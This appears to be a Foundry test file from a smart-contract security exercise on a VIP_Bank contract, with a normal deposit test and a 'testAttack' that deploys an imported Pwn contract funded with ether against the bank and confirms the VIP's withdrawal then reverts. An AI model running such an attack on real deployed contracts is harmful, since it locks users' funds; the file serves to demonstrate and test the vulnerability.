// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import "../src/VIP_Bank.sol";
import "../src/Pwn.sol";

contract CounterTest is Test {
    VIP_Bank public bank;

    function setUp() public {
        bank = new VIP_Bank();
        bank.addVIP(msg.sender);
    }
    function testNormal() public payable {
        vm.prank(msg.sender);
        bank.deposit{value: 0.05 ether}();
        uint bal = bank.balances(msg.sender);
        assertEq(bal, 0.05 ether);
    }
    function testAttack() public payable {
        vm.prank(msg.sender);
        bank.deposit{value: 0.05 ether}();
        new Pwn{value: 0.5 ether}(payable(address(bank)));
        vm.startPrank(msg.sender, msg.sender);
        uint bal = bank.balances(msg.sender);
        vm.expectRevert();
        bank.withdraw(bal);
    }
}
